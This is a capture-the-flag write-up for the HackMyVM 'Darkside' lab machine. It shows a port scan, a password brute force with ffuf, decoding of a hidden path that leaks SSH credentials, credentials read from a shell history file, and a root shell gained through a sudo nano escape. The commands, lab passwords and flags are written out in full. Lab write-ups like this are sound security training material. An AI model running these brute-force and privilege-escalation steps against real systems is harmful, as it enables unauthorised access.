# Darkside

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.137:22
Open 10.0.2.137:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.137
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGsUAEVL2cAs6DRznGSZbiHcacmPbYA9vWz8kXcaAGjjXGnwWeCYbR0X0ju9/4bLeLb6DoEiQwpuJ330ZtqwU3X5I/I7flRQv2IJ0dm/1MrwxkxJpsWftI87Y+9N5lFepv2/sieY4SeMraXiJviNK/Mssk26Xvs1g1If5WIFjf+tffEvzcB/NkyadQ5xU/MutHEljhYY1SToEnMl5scgyw8hq66oPaKoVx6/SkP/CDGMwZ2CYl68To/LP63ysl7oMI8WC6WG710/+awH2t81MAKE+5nnEYFa2KWL6vnItDa5DXhFJGNMUv+vFbvXQn0AG/VK/8RNQmldkNg+M5cpdkgfWfF5Wyuz80Rnx0kFYrZKr3dT1hIokEtLkr2n3hBhvnrk1k/9jtOaojTmwA5f00ejXWYG8h2ev7DxOxmLASSH7JZX3hEsEs9rLbdsVC5yzixMs5I7CyueX5cvM8EMunJiILexR9ANQagr2BQs3ZLD8iTUmwTZHEfv0B9oH1XxM=
|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFrlOgZ0HnkbLedzhpoaC/WbDvXsOpivU5RHqw3sKurIkRKGGej4DbG556kDuehZQK++5BvzSP3iBmvFtEg5VjI=
|   256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGhqCMPf5jUcceElq5NvqBguPShmdreOWWYShYedJyUW
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: The DarkSide
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/darkside/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.137 --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
301      GET        9l       28w      309c http://10.0.2.137/backup => http://10.0.2.137/backup/
200      GET       29l       45w      683c http://10.0.2.137/
200      GET       29l       45w      
```

```bash
└─$ curl http://10.0.2.137/backup/vote.txt
rijaba: Yes
xerosec: Yes
sml: No
cromiphi: No
gatogamer: No
chema: Yes
talleyrand: No
d3b0o: Yes

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
```

```bash
└─$ ffuf -u 'http://10.0.2.137' -H 'Content-Type: application/x-www-form-urlencoded' -d 'user=kevin&pass=FUZZ' -w $rockyou -t 40 -fs 745
iloveyou                [Status: 302, Size: 683, Words: 162, Lines: 30, Duration: 2616ms]
```

![writeup-1.png](/assets/pentest/hackmyvm/darkside/writeup-1.png)

```bash
└─$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base64 -di
ZQRfgJnzɋ7d5xg%base64: invalid input

└─$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base58 -d
c2ZxZWttZ25jdXRqaGJ5cHZ4ZGEub25pb24=                                                                                                                                                                              
└─$ echo 'kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC' | base58 -d | base64 -d
sfqekmgncutjhbypvxda.onion 
```

![writeup-2.png](/assets/pentest/hackmyvm/darkside/writeup-2.png)

```bash
└─$ curl http://10.0.2.137/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password
kevin:ILoveCalisthenics
```

::: info Note
`kevin:ILoveCalisthenics`
:::

## SSH (kevin)

```bash
└─$ sshpass -p 'ILoveCalisthenics' ssh kevin@10.0.2.137
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
```

### User.txt

```
kevin@darkside:~$ cat user.txt
UnbelievableHumble
```

## Privilege Escalation (rijaba)

```bash
kevin@darkside:~$ find /home -ls
     1801      4 drwxr-xr-x   4 root     root         4096 Oct 15  2023 /home
       33      4 drwxr-xr-x   2 rijaba   rijaba       4096 Oct 30  2023 /home/rijaba
    28502      0 lrwxrwxrwx   1 rijaba   rijaba          9 Oct 30  2023 /home/rijaba/.bash_history -> /dev/null
     6885      4 -rw-r--r--   1 rijaba   rijaba        807 Oct 15  2023 /home/rijaba/.profile
    35081      4 -rw-r--r--   1 rijaba   rijaba        220 Oct 15  2023 /home/rijaba/.bash_logout
    37039      4 -rw-r--r--   1 rijaba   rijaba       3526 Oct 15  2023 /home/rijaba/.bashrc
     4413      4 drwxr-xr-x   3 kevin    kevin        4096 Oct 30  2023 /home/kevin
    63318      4 -rw-r--r--   1 kevin    kevin          19 Oct 15  2023 /home/kevin/user.txt
    63175      4 drwxr-xr-x   3 kevin    kevin        4096 Oct 15  2023 /home/kevin/.local
    63294      4 drwx------   3 kevin    kevin        4096 Oct 15  2023 /home/kevin/.local/share
    63315      4 drwx------   2 kevin    kevin        4096 Oct 15  2023 /home/kevin/.local/share/nano
    37987      0 lrwxrwxrwx   1 kevin    kevin           9 Oct 30  2023 /home/kevin/.bash_history -> /dev/null
    36522      4 -rw-r--r--   1 kevin    kevin         807 Oct 15  2023 /home/kevin/.profile
    63317      4 -rw-r--r--   1 kevin    kevin         113 Oct 15  2023 /home/kevin/.history # Sussy Baka
    36869      4 -rw-r--r--   1 kevin    kevin         220 Oct 15  2023 /home/kevin/.bash_logout
    37865      4 -rw-r--r--   1 kevin    kevin        3526 Oct 15  2023 /home/kevin/.bashrc
```

```bash
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo "Congratulations on the OSCP Xerosec"
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba
```

::: info Note
`rejiba:ILoveJabita`
:::

## Privilege Escalation (root)

```bash
rijaba@darkside:~$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano
```

- [https://gtfobins.github.io/gtfobins/nano/#sudo](https://gtfobins.github.io/gtfobins/nano/#sudo)

```bash
rijaba@darkside:~$ sudo nano
^R^X
reset; bash 1>&0 2>&0

root@darkside:/home/rijaba# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@darkside:/home/rijaba# cat /root/root.txt
youcametothedarkside
```